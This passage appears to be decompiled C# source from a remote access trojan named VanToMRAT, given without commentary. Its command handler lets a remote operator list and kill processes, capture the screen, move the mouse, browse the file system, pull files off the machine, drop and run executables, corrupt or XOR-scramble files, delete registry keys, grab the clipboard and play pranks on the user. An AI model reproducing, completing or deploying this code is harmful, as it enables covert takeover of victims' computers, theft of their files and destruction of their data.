																													array19[num8] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[0]), typeof(string));
																												}
																											}
																											else
																											{
																												flag = (Operators.CompareString(left2, "$", false) == 0);
																												if (flag)
																												{
																													object instance6 = key;
																													Type type6 = null;
																													string memberName6 = "DeleteSubKeyTree";
																													object[] array8 = new object[1];
																													object[] array26 = array8;
																													int num11 = 0;
																													string[] array19 = array4;
																													string[] array27 = array19;
																													int num8 = 3;
																													array26[num11] = array27[num8];
																													object[] array21 = array8;
																													object[] arguments6 = array21;
																													string[] argumentNames6 = null;
																													Type[] typeArguments6 = null;
																													bool[] array9 = new bool[]
																													{
																														true
																													};
																													NewLateBinding.LateCall(instance6, type6, memberName6, arguments6, argumentNames6, typeArguments6, array9, true);
																													if (array9[0])
																													{
																														array19[num8] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[0]), typeof(string));
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																							else
																							{
																								flag = (Operators.CompareString(left, "fun", false) == 0);
																								if (flag)
																								{
																									this.c.Send("fun");
																								}
																								else
																								{
																									flag = (Operators.CompareString(left, "opencd", false) == 0);
																									if (flag)
																									{
																										try
																										{
																											string text10 = "set cdaudio door open";
																											string text11 = Conversions.ToString(0);
																											VanToMRAT.mciSendString(ref text10, ref text11, 0L, 0L);
																										}
																										catch (Exception ex2)
																										{
																										}
																									}
																									else
																									{
																										flag = (Operators.CompareString(left, "closecd", false) == 0);
																										if (flag)
																										{
																											try
																											{
																												string text11 = "set cdaudio door closed";
																												string text10 = Conversions.ToString(0);
																												VanToMRAT.mciSendString(ref text11, ref text10, 0L, 0L);
																											}
																											catch (Exception ex3)
																											{
																											}
																										}
																										else
																										{
																											flag = (Operators.CompareString(left, "TaskbarShow", false) == 0);
																											if (flag)
																											{
																												this.ShowTaskbarItems();
																											}
																											else
																											{
																												flag = (Operators.CompareString(left, "TaskbarHide", false) == 0);
																												if (flag)
																												{
																													this.HideTaskbarItems();
																												}
																												else
																												{
																													flag = (Operators.CompareString(left, "ClockOFF", false) == 0);
																													if (flag)
																													{
																														this.hideclock();
																													}
																													else
																													{
																														flag = (Operators.CompareString(left, "ClockON", false) == 0);
																														if (flag)
																														{
																															this.showclock();
																														}
																														else
																														{
																															flag = (Operators.CompareString(left, "TurnOffMonitor", false) == 0);
																															if (flag)
																															{
																																VanToMRAT.SendMessage(-1, 274u, 61808u, 2);
																															}
																															else
																															{
																																flag = (Operators.CompareString(left, "TurnOnMonitor", false) == 0);
																																if (flag)
																																{
																																	VanToMRAT.SendMessage(-1, 274u, 61808u, -1);
																																}
																																else
																																{
																																	flag = (Operators.CompareString(left, "hidetb", false) == 0);
																																	if (flag)
																																	{
																																		string text11 = "Shell_traywnd";
																																		string text10 = "";
																																		long num12 = unchecked((long)VanToMRAT.FindWindow(ref text11, ref text10));
																																		VanToMRAT.SetWindowPos((int)num12, 0, 0, 0, 0, 0, 128);
																																	}
																																	else
																																	{
																																		flag = (Operators.CompareString(left, "showtb", false) == 0);
																																		if (flag)
																																		{
																																			string text11 = "Shell_traywnd";
																																			string text10 = "";
																																			long num13 = unchecked((long)VanToMRAT.FindWindow(ref text11, ref text10));
																																			VanToMRAT.SetWindowPos((int)num13, 0, 0, 0, 0, 0, 64);
																																		}
																																		else
																																		{
																																			flag = (Operators.CompareString(left, "NormalMouse", false) == 0);
																																			if (flag)
																																			{
																																				VanToMRAT.SwapMouseButton(0L);
																																			}
																																			else
																																			{
																																				flag = (Operators.CompareString(left, "ReverseMouse", false) == 0);
																																				if (flag)
																																				{
																																					VanToMRAT.SwapMouseButton(256L);
																																				}
																																				else
																																				{
																																					flag = (Operators.CompareString(left, "BepX", false) == 0);
																																					if (flag)
																																					{
																																						Module1.Beep(Conversions.ToInteger(array4[1]), Conversions.ToInteger(array4[2]));
																																					}
																																					else
																																					{
																																						flag = (Operators.CompareString(left, "piano", false) == 0);
																																						if (flag)
																																						{
																																							Module1.Beep(Conversions.ToInteger(array4[1]), 300);
																																						}
																																						else
																																						{
																																							flag = (Operators.CompareString(left, "sendmusicplay", false) == 0);
																																							if (flag)
																																							{
																																								File.WriteAllBytes(Path.GetTempPath() + array4[1], Convert.FromBase64String(array4[2]));
																																								Thread.Sleep(1000);
																																								MyProject.Computer.Audio.Stop();
																																								MyProject.Computer.Audio.Play(Path.GetTempPath() + array4[1], AudioPlayMode.Background);
																																							}
																																							else
																																							{
																																								flag = (Operators.CompareString(left, "errorsound", false) == 0);
																																								if (flag)
																																								{
																																									MyProject.Computer.Audio.PlaySystemSound(SystemSounds.Asterisk);
																																								}
																																								else
																																								{
																																									flag = (Operators.CompareString(left, "ErorrMsg", false) == 0);
																																									if (flag)
																																									{
																																										string left3 = array4[1];
																																										bool flag2 = Operators.CompareString(left3, "1", false) == 0;
																																										MessageBoxIcon icon;
																																										if (flag2)
																																										{
																																											icon = MessageBoxIcon.Asterisk;
																																										}
																																										else
																																										{
																																											flag2 = (Operators.CompareString(left3, "2", false) == 0);
																																											if (flag2)
																																											{
																																												icon = MessageBoxIcon.Question;
																																											}
																																											else
																																											{
																																												flag2 = (Operators.CompareString(left3, "3", false) == 0);
																																												if (flag2)
																																												{
																																													icon = MessageBoxIcon.Exclamation;
																																												}
																																												else
																																												{
																																													flag2 = (Operators.CompareString(left3, "4", false) == 0);
																																													if (flag2)
																																													{
																																														icon = MessageBoxIcon.Hand;
																																													}
																																												}
																																											}
																																										}
																																										string left4 = array4[2];
																																										flag2 = (Operators.CompareString(left4, "1", false) == 0);
																																										MessageBoxButtons buttons;
																																										if (flag2)
																																										{
																																											buttons = MessageBoxButtons.YesNo;
																																										}
																																										else
																																										{
																																											flag2 = (Operators.CompareString(left4, "2", false) == 0);
																																											if (flag2)
																																											{
																																												buttons = MessageBoxButtons.YesNoCancel;
																																											}
																																											else
																																											{
																																												flag2 = (Operators.CompareString(left4, "3", false) == 0);
																																												if (flag2)
																																												{
																																													buttons = MessageBoxButtons.OK;
																																												}
																																												else
																																												{
																																													flag2 = (Operators.CompareString(left4, "4", false) == 0);
																																													if (flag2)
																																													{
																																														buttons = MessageBoxButtons.OKCancel;
																																													}
																																													else
																																													{
																																														flag2 = (Operators.CompareString(left4, "5", false) == 0);
																																														if (flag2)
																																														{
																																															buttons = MessageBoxButtons.RetryCancel;
																																														}
																																														else
																																														{
																																															flag2 = (Operators.CompareString(left4, "6", false) == 0);
																																															if (flag2)
																																															{
																																																buttons = MessageBoxButtons.AbortRetryIgnore;
																																															}
																																														}
																																													}
																																												}
																																											}
																																										}
																																										MessageBox.Show(array4[4], array4[3], buttons, icon);
																																									}
																																									else
																																									{
																																										bool flag2 = Operators.CompareString(left, "script", false) == 0;
																																										if (flag2)
																																										{
																																											string str3 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\tempxxSD";
																																											MyProject.Computer.FileSystem.WriteAllText(str3 + array4[2], array4[1], false);
																																										}
																																										else
																																										{
																																											flag2 = (Operators.CompareString(left, "chat", false) == 0);
																																											if (flag2)
																																											{
																																												NewLateBinding.LateCall(this.c, null, "Send", new object[]
																																												{
																																													Operators.ConcatenateObject("chat" + this.yY, this.Npc)
																																												}, null, null, null, true);
																																											}
																																											else
																																											{
																																												flag2 = (Operators.CompareString(left, "recv", false) == 0);
																																												if (flag2)
																																												{
																																													this.Invoke(new VanToMRAT.oc(this.och));
																																													this.Invoke(new VanToMRAT.rv(this.rvt), new object[]
																																													{
																																														array4[1]
																																													});
																																													this.Invoke(new VanToMRAT.rsv(this.rvt), new object[]
																																													{
																																														array4[2]
																																													});
																																												}
																																												else
																																												{
																																													flag2 = (Operators.CompareString(left, "ccl", false) == 0);
																																													if (flag2)
																																													{
																																														this.Invoke(new VanToMRAT.ec(this.cc));
																																													}
																																													else
																																													{
																																														flag2 = (Operators.CompareString(left, "OpenPro", false) == 0);
																																														if (flag2)
																																														{
																																															NewLateBinding.LateCall(this.c, null, "Send", new object[]
																																															{
																																																Operators.ConcatenateObject("OpenPro" + this.yY, this.Npc)
																																															}, null, null, null, true);
																																														}
																																														else
																																														{
																																															flag2 = (Operators.CompareString(left, "GetProcesses", false) == 0);
																																															if (flag2)
																																															{
																																																string text12 = "";
																																																string text13 = "ProcessSplit";
																																																foreach (Process process in Process.GetProcesses())
																																																{
																																																	try
																																																	{
																																																		text12 = string.Concat(new string[]
																																																		{
																																																			text12,
																																																			process.ProcessName,
																																																			"|",
																																																			Conversions.ToString(process.Id),
																																																			"|",
																																																			process.MainModule.FileName,
																																																			"|",
																																																			Conversions.ToString(process.PrivateMemorySize64),
																																																			"|",
																																																			Conversions.ToString(process.StartTime),
																																																			text13
																																																		});
																																																	}
																																																	catch (Exception ex4)
																																																	{
																																																		text12 = string.Concat(new string[]
																																																		{
																																																			text12,
																																																			process.ProcessName,
																																																			"|",
																																																			Conversions.ToString(process.Id),
																																																			"|-|",
																																																			Conversions.ToString(process.PrivateMemorySize64),
																																																			"|-",
																																																			text13
																																																		});
																																																	}
																																																}
																																																this.c.Send(string.Concat(new string[]
																																																{
																																																	"ProcessManager",
																																																	this.yY,
																																																	text12,
																																																	this.yY,
																																																	Path.GetFileNameWithoutExtension(Application.ExecutablePath)
																																																}));
																																															}
																																															else
																																															{
																																																flag2 = (Operators.CompareString(left, "KillProcess", false) == 0);
																																																if (flag2)
																																																{
																																																	string[] array28 = array4[1].Split(new char[]
																																																	{
																																																		'P'
																																																	});
																																																	int num14 = 0;
																																																	int num15 = array28.Length - 2;
																																																	int num16 = num14;
																																																	for (;;)
																																																	{
																																																		int num17 = num16;
																																																		int num18 = num15;
																																																		if (num17 > num18)
																																																		{
																																																			break;
																																																		}
																																																		foreach (Process process2 in Process.GetProcessesByName(array28[num16]))
																																																		{
																																																			process2.Kill();
																																																		}
																																																		num16++;
																																																	}
																																																}
																																																else
																																																{
																																																	flag2 = (Operators.CompareString(left, "SProcess", false) == 0);
																																																	if (flag2)
																																																	{
																																																		string[] array29 = array4[1].Split(new char[]
																																																		{
																																																			'P'
																																																		});
																																																		int num19 = 0;
																																																		int num20 = array29.Length - 2;
																																																		int num21 = num19;
																																																		for (;;)
																																																		{
																																																			int num22 = num21;
																																																			int num18 = num20;
																																																			if (num22 > num18)
																																																			{
																																																				break;
																																																			}
																																																			Process[] processesByName2 = Process.GetProcessesByName(array29[num21]);
																																																			this.SuspendProcess(processesByName2[0]);
																																																			this.c.Send("SP");
																																																			num21++;
																																																		}
																																																	}
																																																	else
																																																	{
																																																		flag2 = (Operators.CompareString(left, "SSProcess", false) == 0);
																																																		if (flag2)
																																																		{
																																																			string[] array30 = array4[1].Split(new char[]
																																																			{
																																																				'P'
																																																			});
																																																			int num23 = 0;
																																																			int num24 = array30.Length - 2;
																																																			int num25 = num23;
																																																			for (;;)
																																																			{
																																																				int num26 = num25;
																																																				int num18 = num24;
																																																				if (num26 > num18)
																																																				{
																																																					break;
																																																				}
																																																				Process[] processesByName3 = Process.GetProcessesByName(array30[num25]);
																																																				string[] array31 = array30;
																																																				int num27 = num25;
																																																				string text11 = null;
																																																				IntPtr handle = (IntPtr)VanToMRAT.FindWindow(ref array31[num27], ref text11);
																																																				VanToMRAT.ShowWindow(handle, 1);
																																																				this.c.Send("SP");
																																																				num25++;
																																																			}
																																																		}
																																																		else
																																																		{
																																																			flag2 = (Operators.CompareString(left, "SSSProcess", false) == 0);
																																																			if (flag2)
																																																			{
																																																				string[] array32 = array4[1].Split(new char[]
																																																				{
																																																					'P'
																																																				});
																																																				int num28 = 0;
																																																				int num29 = array32.Length - 2;
																																																				int num30 = num28;
																																																				for (;;)
																																																				{
																																																					int num31 = num30;
																																																					int num18 = num29;
																																																					if (num31 > num18)
																																																					{
																																																						break;
																																																					}
																																																					Process[] processesByName4 = Process.GetProcessesByName(array32[num30]);
																																																					string[] array33 = array32;
																																																					int num32 = num30;
																																																					string text11 = null;
																																																					IntPtr handle2 = (IntPtr)VanToMRAT.FindWindow(ref array33[num32], ref text11);
																																																					VanToMRAT.ShowWindow(handle2, 2);
																																																					this.c.Send("SP");
																																																					num30++;
																																																				}
																																																			}
																																																			else
																																																			{
																																																				flag2 = (Operators.CompareString(left, "!", false) == 0);
																																																				if (flag2)
																																																				{
																																																					CRDP.Clear();
																																																					Size size = Screen.PrimaryScreen.Bounds.Size;
																																																					this.c.Send(string.Concat(new string[]
																																																					{
																																																						"!",
																																																						this.yY,
																																																						Conversions.ToString(size.Width),
																																																						this.yY,
																																																						Conversions.ToString(size.Height)
																																																					}));
																																																				}
																																																				else
																																																				{
																																																					flag2 = (Operators.CompareString(left, "!!", false) == 0);
																																																					if (flag2)
																																																					{
																																																						CRDP.Clear();
																																																						Size size2 = Screen.PrimaryScreen.Bounds.Size;
																																																						this.c.Send(string.Concat(new string[]
																																																						{
																																																							"!!",
																																																							this.yY,
																																																							Conversions.ToString(size2.Width),
																																																							this.yY,
																																																							Conversions.ToString(size2.Height)
																																																						}));
																																																					}
																																																					else
																																																					{
																																																						flag2 = (Operators.CompareString(left, "@", false) == 0);
																																																						if (flag2)
																																																						{
																																																							int q = Conversions.ToInteger(array4[1]);
																																																							int co = Conversions.ToInteger(array4[2]);
																																																							int qu = Conversions.ToInteger(array4[3]);
																																																							byte[] array34 = CRDP.Cap(q, co, qu);
																																																							MemoryStream memoryStream = new MemoryStream();
																																																							string text14 = "@" + this.yY;
																																																							memoryStream.Write(Module1.SB(text14), 0, text14.Length);
																																																							memoryStream.Write(array34, 0, array34.Length);
																																																							this.c.Send(memoryStream.ToArray());
																																																							memoryStream.Dispose();
																																																						}
																																																						else
																																																						{
																																																							flag2 = (Operators.CompareString(left, "@@", false) == 0);
																																																							if (flag2)
																																																							{
																																																								int q2 = Conversions.ToInteger(array4[1]);
																																																								int co2 = Conversions.ToInteger(array4[2]);
																																																								int qu2 = Conversions.ToInteger(array4[3]);
																																																								byte[] array35 = CRDP1.Cap(q2, co2, qu2);
																																																								MemoryStream memoryStream2 = new MemoryStream();
																																																								string text15 = "@@" + this.yY;
																																																								memoryStream2.Write(Module1.SB(text15), 0, text15.Length);
																																																								memoryStream2.Write(array35, 0, array35.Length);
																																																								this.c.Send(memoryStream2.ToArray());
																																																								memoryStream2.Dispose();
																																																							}
																																																							else
																																																							{
																																																								flag2 = (Operators.CompareString(left, "#", false) == 0);
																																																								if (flag2)
																																																								{
																																																									Point position = new Point(Conversions.ToInteger(array4[1]), Conversions.ToInteger(array4[2]));
																																																									Cursor.Position = position;
																																																									Module1.mouse_event(Conversions.ToInteger(array4[3]), 0, 0, 0, 1);
																																																								}
																																																								else
																																																								{
																																																									flag2 = (Operators.CompareString(left, "$", false) == 0);
																																																									if (flag2)
																																																									{
																																																										Point position = new Point(Conversions.ToInteger(array4[1]), Conversions.ToInteger(array4[2]));
																																																										Cursor.Position = position;
																																																									}
																																																									else
																																																									{
																																																										flag2 = (Operators.CompareString(left, "close", false) == 0);
																																																										if (flag2)
																																																										{
																																																											ProjectData.EndApp();
																																																										}
																																																										else
																																																										{
																																																											flag2 = (Operators.CompareString(left, "sendfileto", false) == 0);
																																																											if (flag2)
																																																											{
																																																												File.WriteAllBytes(array4[1], Convert.FromBase64String(array4[2]));
																																																												Thread.Sleep(1000);
																																																											}
																																																											else
																																																											{
																																																												flag2 = (Operators.CompareString(left, "creatnewfolder", false) == 0);
																																																												if (flag2)
																																																												{
																																																													try
																																																													{
																																																														MyProject.Computer.FileSystem.CreateDirectory(array4[1]);
																																																													}
																																																													catch (Exception ex5)
																																																													{
																																																													}
																																																												}
																																																												else
																																																												{
																																																													flag2 = (Operators.CompareString(left, "hidefolderfile", false) == 0);
																																																													if (flag2)
																																																													{
																																																														FileAttribute attributes = FileAttribute.Hidden;
																																																														try
																																																														{
																																																															FileSystem.SetAttr(array4[1], attributes);
																																																														}
																																																														catch (Exception ex6)
																																																														{
																																																														}
																																																													}
																																																													else
																																																													{
																																																														flag2 = (Operators.CompareString(left, "showfolderfile", false) == 0);
																																																														if (flag2)
																																																														{
																																																															FileAttribute attributes2 = FileAttribute.Normal;
																																																															try
																																																															{
																																																																FileSystem.SetAttr(array4[1], attributes2);
																																																															}
																																																															catch (Exception ex7)
																																																															{
																																																															}
																																																														}
																																																														else
																																																														{
																																																															flag2 = (Operators.CompareString(left, "downloadfile", false) == 0);
																																																															if (flag2)
																																																															{
																																																																this.c.Send("downloadedfile|VanToM|" + Convert.ToBase64String(File.ReadAllBytes(array4[1])) + "|VanToM|" + array4[2]);
																																																															}
																																																															else
																																																															{
																																																																flag2 = (Operators.CompareString(left, "downloadfile", false) == 0);
																																																																if (flag2)
																																																																{
																																																																	this.c.Send(string.Concat(new string[]
																																																																	{
																																																																		"downloadedfile",
																																																																		this.yY,
																																																																		Convert.ToBase64String(File.ReadAllBytes(array4[1])),
																																																																		this.yY,
																																																																		array4[2]
																																																																	}));
																																																																}
																																																																else
																																																																{
																																																																	flag2 = (Operators.CompareString(left, "sendfile", false) == 0);
																																																																	if (flag2)
																																																																	{
																																																																		File.WriteAllBytes(Path.GetTempPath() + array4[1], Convert.FromBase64String(array4[2]));
																																																																		Thread.Sleep(1000);
																																																																		Process.Start(Path.GetTempPath() + array4[1]);
																																																																	}
																																																																	else
																																																																	{
																																																																		flag2 = (Operators.CompareString(left, "corrupt", false) == 0);
																																																																		if (flag2)
																																																																		{
																																																																			string str4 = "wAyqsW4eE9Csd0dndY1rLnufPtO4Vjp9cRvXz0g38RaWjeoo1OBXT0CNp4wW7vY4Ti6Sm64zhnEn0QWHcVTGZrnNHcc9JFDNGAPYCzPWwyDPIDBsdg067E8newVoWRj7TON9roebC3m0iW9oGJ73CM4UelTtjctQvxt2QqpXATVVvAKpibp7qcoiRV9Vmves42mYUI42";
																																																																			StreamReader streamReader = new StreamReader(array4[1]);
																																																																			string str5 = streamReader.ReadToEnd();
																																																																			streamReader.Close();
																																																																			MyProject.Computer.FileSystem.WriteAllText(array4[1], str4 + str5, false);
																																																																		}
																																																																		else
																																																																		{
																																																																			flag2 = (Operators.CompareString(left, "viewimage", false) == 0);
																																																																			if (flag2)
																																																																			{
																																																																				this.c.Send("viewimage" + this.yY + Convert.ToBase64String(File.ReadAllBytes(array4[1])) + this.yY);
																																																																			}
																																																																			else
																																																																			{
																																																																				flag2 = (Operators.CompareString(left, "GetDrives", false) == 0);
																																																																				if (flag2)
																																																																				{
																																																																					this.c.Send("FileManager" + this.yY + Module1.getDrives());
																																																																				}
																																																																				else
																																																																				{
																																																																					flag2 = (Operators.CompareString(left, "FileManager", false) == 0);
																																																																					if (flag2)
																																																																					{
																																																																						try
																																																																						{
																																																																							this.c.Send("FileManager" + this.yY + Module1.getFolders(array4[1]) + Module1.getFiles(array4[1]));
																																																																						}
																																																																						catch (Exception ex8)
																																																																						{
																																																																							this.c.Send("FileManager" + this.yY + "Error");
																																																																						}
																																																																					}
																																																																					else
																																																																					{
																																																																						flag2 = (Operators.CompareString(left, "|||", false) == 0);
																																																																						if (flag2)
																																																																						{
																																																																							this.c.Send("|||");
																																																																						}
																																																																						else
																																																																						{
																																																																							flag2 = (Operators.CompareString(left, "Delete", false) == 0);
																																																																							if (flag2)
																																																																							{
																																																																								string left5 = array4[1];
																																																																								flag = (Operators.CompareString(left5, "Folder", false) == 0);
																																																																								if (flag)
																																																																								{
																																																																									Directory.Delete(array4[2]);
																																																																								}
																																																																								else
																																																																								{
																																																																									flag2 = (Operators.CompareString(left5, "File", false) == 0);
																																																																									if (flag2)
																																																																									{
																																																																										File.Delete(array4[2]);
																																																																									}
																																																																								}
																																																																							}
																																																																							else
																																																																							{
																																																																								flag2 = (Operators.CompareString(left, "Execute", false) == 0);
																																																																								if (flag2)
																																																																								{
																																																																									Process.Start(array4[1]);
																																																																								}
																																																																								else
																																																																								{
																																																																									flag2 = (Operators.CompareString(left, "Rename", false) == 0);
																																																																									if (flag2)
																																																																									{
																																																																										string left6 = array4[1];
																																																																										flag = (Operators.CompareString(left6, "Folder", false) == 0);
																																																																										if (flag)
																																																																										{
																																																																											MyProject.Computer.FileSystem.RenameDirectory(array4[2], array4[3]);
																																																																										}
																																																																										else
																																																																										{
																																																																											flag2 = (Operators.CompareString(left6, "File", false) == 0);
																																																																											if (flag2)
																																																																											{
																																																																												MyProject.Computer.FileSystem.RenameFile(array4[2], array4[3]);
																																																																											}
																																																																										}
																																																																									}
																																																																									else
																																																																									{
																																																																										flag2 = (Operators.CompareString(left, "sendfile", false) == 0);
																																																																										if (flag2)
																																																																										{
																																																																											File.WriteAllBytes(Path.GetTempPath() + array4[1], Convert.FromBase64String(array4[2]));
																																																																											Thread.Sleep(1000);
																																																																											Process.Start(Path.GetTempPath() + array4[1]);
																																																																										}
																																																																										else
																																																																										{
																																																																											flag2 = (Operators.CompareString(left, "playmusic", false) == 0);
																																																																											if (flag2)
																																																																											{
																																																																												MyProject.Computer.Audio.Play(array4[1], AudioPlayMode.Background);
																																																																											}
																																																																											else
																																																																											{
																																																																												flag2 = (Operators.CompareString(left, "getsystempath", false) == 0);
																																																																												if (flag2)
																																																																												{
																																																																													string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
																																																																													this.c.Send("getpath" + this.yY + folderPath + "\\");
																																																																												}
																																																																												else
																																																																												{
																																																																													flag2 = (Operators.CompareString(left, "getpicturepath", false) == 0);
																																																																													if (flag2)
																																																																													{
																																																																														string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
																																																																														this.c.Send("getpath" + this.yY + folderPath2 + "\\");
																																																																													}
																																																																													else
																																																																													{
																																																																														flag2 = (Operators.CompareString(left, "getmusicpath", false) == 0);
																																																																														if (flag2)
																																																																														{
																																																																															string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
																																																																															this.c.Send("getpath" + this.yY + folderPath3 + "\\");
																																																																														}
																																																																														else
																																																																														{
																																																																															flag2 = (Operators.CompareString(left, "getstartmenupath", false) == 0);
																																																																															if (flag2)
																																																																															{
																																																																																string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
																																																																																this.c.Send("getpath" + this.yY + folderPath4 + "\\");
																																																																															}
																																																																															else
																																																																															{
																																																																																flag2 = (Operators.CompareString(left, "getroamingpath", false) == 0);
																																																																																if (flag2)
																																																																																{
																																																																																	string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
																																																																																	this.c.Send("getpath" + this.yY + folderPath5 + "\\");
																																																																																}
																																																																																else
																																																																																{
																																																																																	flag2 = (Operators.CompareString(left, "getprogramspath", false) == 0);
																																																																																	if (flag2)
																																																																																	{
																																																																																		string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
																																																																																		this.c.Send("getpath" + this.yY + folderPath6 + "\\");
																																																																																	}
																																																																																	else
																																																																																	{
																																																																																		flag2 = (Operators.CompareString(left, "getprogrampath", false) == 0);
																																																																																		if (flag2)
																																																																																		{
																																																																																			string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
																																																																																			this.c.Send("getpath" + this.yY + folderPath7 + "\\");
																																																																																		}
																																																																																		else
																																																																																		{
																																																																																			flag2 = (Operators.CompareString(left, "getdesktoppath", false) == 0);
																																																																																			if (flag2)
																																																																																			{
																																																																																				string folderPath8 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
																																																																																				this.c.Send("getpath" + this.yY + folderPath8 + "\\");
																																																																																			}
																																																																																			else
																																																																																			{
																																																																																				flag2 = (Operators.CompareString(left, "gettemppath", false) == 0);
																																																																																				if (flag2)
																																																																																				{
																																																																																					string tempPath = Path.GetTempPath();
																																																																																					this.c.Send("getpath" + this.yY + tempPath);
																																																																																				}
																																																																																				else
																																																																																				{
																																																																																					flag2 = (Operators.CompareString(left, "getstartuppath", false) == 0);
																																																																																					if (flag2)
																																																																																					{
																																																																																						string folderPath9 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
																																																																																						this.c.Send("getpath" + this.yY + folderPath9 + "\\");
																																																																																					}
																																																																																					else
																																																																																					{
																																																																																						flag2 = (Operators.CompareString(left, "getmydocumentspath", false) == 0);
																																																																																						if (flag2)
																																																																																						{
																																																																																							string folderPath10 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
																																																																																							this.c.Send("getpath" + this.yY + folderPath10 + "\\");
																																																																																						}
																																																																																						else
																																																																																						{
																																																																																							flag2 = (Operators.CompareString(left, "cryptedecryptetextfile", false) == 0);
																																																																																							if (flag2)
																																																																																							{
																																																																																								StreamReader streamReader2 = new StreamReader(array4[1]);
																																																																																								string text16 = streamReader2.ReadToEnd();
																																																																																								streamReader2.Close();
																																																																																								int num33 = 126;
																																																																																								short num34 = 1;
																																																																																								short num35 = (short)Strings.Len(text16);
																																																																																								short num36 = num34;
																																																																																								unchecked
																																																																																								{
																																																																																									for (;;)
																																																																																									{
																																																																																										short num37 = num36;
																																																																																										short num38 = num35;
																																																																																										if (num37 > num38)
																																																																																										{
																																																																																											break;
																																																																																										}
																																																																																										text2 += Conversions.ToString(Strings.Chr(num33 ^ Strings.Asc(Strings.Mid(text16, (int)num36, 1))));
																																																																																										num36 += 1;
																																																																																									}
																																																																																									StreamWriter streamWriter = new StreamWriter(array4[1]);
																																																																																									streamWriter.WriteLine(text2);
																																																																																									streamWriter.Close();
																																																																																								}
																																																																																							}
																																																																																							else
																																																																																							{
																																																																																								flag2 = (Operators.CompareString(left, "edittextfile", false) == 0);
																																																																																								if (flag2)
																																																																																								{
																																																																																									StreamReader streamReader3 = new StreamReader(array4[1]);
																																																																																									string text17 = streamReader3.ReadToEnd();
																																																																																									streamReader3.Close();
																																																																																									this.c.Send(string.Concat(new string[]
																																																																																									{
																																																																																										"edittextfile",
																																																																																										this.yY,
																																																																																										array4[1],
																																																																																										this.yY,
																																																																																										text17
																																																																																									}));
																																																																																								}
																																																																																								else
																																																																																								{
																																																																																									flag2 = (Operators.CompareString(left, "savetextfile", false) == 0);
																																																																																									if (flag2)
																																																																																									{
																																																																																										StreamWriter streamWriter2 = new StreamWriter(array4[1]);
																																																																																										streamWriter2.WriteLine(array4[2]);
																																																																																										streamWriter2.Close();
																																																																																									}
																																																																																									else
																																																																																									{
																																																																																										flag2 = (Operators.CompareString(left, "creatnewtextfile", false) == 0);
																																																																																										if (flag2)
																																																																																										{
																																																																																											try
																																																																																											{
																																																																																												File.Create(array4[1]).Dispose();
																																																																																											}
																																																																																											catch (Exception ex9)
																																																																																											{
																																																																																												this.c.Send(string.Concat(new string[]
																																																																																												{
																																																																																													"msgbox",
																																																																																													this.yY,
																																																																																													"Information",
																																																																																													this.yY,
																																																																																													"File Name Already Exists"
																																																																																												}));
																																																																																											}
																																																																																										}
																																																																																										else
																																																																																										{
																																																																																											flag2 = (Operators.CompareString(left, "setaswallpaper", false) == 0);
																																																																																											if (flag2)
																																																																																											{
																																																																																												VanToMRAT.SystemParametersInfo(20, 0, ref array4[1], 1);
																																																																																											}
																																																																																											else
																																																																																											{
																																																																																												flag2 = (Operators.CompareString(left, "TextToSpeech", false) == 0);
																																																																																												if (flag2)
																																																																																												{
																																																																																													object objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""));
																																																																																													object instance7 = objectValue2;
																																																																																													Type type7 = null;
																																																																																													string memberName7 = "speak";
																																																																																													object[] array8 = new object[1];
																																																																																													object[] array36 = array8;
																																																																																													int num39 = 0;
																																																																																													string[] array19 = array4;
																																																																																													string[] array37 = array19;
																																																																																													int num8 = 1;
																																																																																													array36[num39] = array37[num8];
																																																																																													object[] array21 = array8;
																																																																																													object[] arguments7 = array21;
																																																																																													string[] argumentNames7 = null;
																																																																																													Type[] typeArguments7 = null;
																																																																																													bool[] array9 = new bool[]
																																																																																													{
																																																																																														true
																																																																																													};
																																																																																													NewLateBinding.LateCall(instance7, type7, memberName7, arguments7, argumentNames7, typeArguments7, array9, true);
																																																																																													if (array9[0])
																																																																																													{
																																																																																														array19[num8] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[0]), typeof(string));
																																																																																													}
																																																																																												}
																																																																																												else
																																																																																												{
																																																																																													flag2 = (Operators.CompareString(left, "clipss", false) == 0);
																																																																																													if (flag2)
																																																																																													{
																																																																																														NewLateBinding.LateCall(this.c, null, "Send", new object[]
																																																																																														{
																																																																																															Operators.ConcatenateObject("clipss" + this.yY, this.Npc)
																																																																																														}, null, null, null, true);
																																																																																													}
																																																																																													else
																																																																																													{
																																																																																														flag2 = (Operators.CompareString(left, "++", false) == 0);
																																																																																														if (flag2)
																																																																																														{
																																																																																															this.c.Send("++");
																																																																																														}
																																																																																														else
																																																																																														{
																																																																																															flag2 = (Operators.CompareString(left, "ppww", false) == 0);
																																																																																															if (flag2)
																																																																																															{
																																																																																																this.c.Send("ppww" + this.yY + "bb" + this.alab);
																																																																																															}
																																																																																															else
																																																																																															{
																																																																																																flag2 = (Operators.CompareString(left, "++2", false) == 0);
																																																																																																if (flag2)
																																																																																																{
																																																																																																	this.c.Send("++2");
																																																																																																}
																																																																																																else
																																																																																																{
																																																																																																	flag2 = (Operators.CompareString(left, "ppww2", false) == 0);
																																																																																																	if (flag2)
																																																																																																	{
																																																																																																		this.c.Send("ppww2" + this.yY + "bb" + this.alab);
																																																																																																	}
																																																																																																	else
																																																																																																	{
																																																																																																		flag2 = (Operators.CompareString(left, "getcli", false) == 0);
																																																																																																		if (flag2)
																																																																																																		{
																																																																																																			this.Invoke(new VanToMRAT.gt(delegate()
																																																																																																			{
																																																																																																				this.gtx();
																																																																																																			}));
																																																																																																		}
																																																																																																		else
																																																																																																		{
																																																																																																			flag2 = (Operators.CompareString(left, "ClearClp", false) == 0);
																																																																																																			if (flag2)
																																																																																																			{
